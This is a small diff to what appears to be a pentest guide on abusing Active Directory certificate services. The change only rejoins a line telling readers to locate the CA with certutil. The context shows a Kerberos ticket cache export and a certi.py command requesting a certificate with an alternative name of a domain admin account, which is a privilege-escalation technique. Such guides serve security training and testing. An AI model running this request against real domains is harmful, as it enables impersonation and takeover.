@@ -175,8 +175,7 @@ export KRB5CCNAME=johndo-lowpriv.ccache
 
 ### Requesting certificate with alternative name
 
-To find the exact Certificate Authority (CA) use `
-certutil –config – -ping` in CMD (<https://www.cloudservus.com/blog/how-to-find-a-certificate-authority-in-your-active-directory-environment>).
+To find the exact Certificate Authority (CA) use `certutil –config – -ping` in CMD (<https://www.cloudservus.com/blog/how-to-find-a-certificate-authority-in-your-active-directory-environment>).
 
 ```plain
 python3 certi.py req 'offsec.nl/johndo-lowpriv@DC01PKI.offsec.nl' offsec-DC01PKI-CA -k -n --alt-name johnDomainAdmin --template UsersOffsecAD
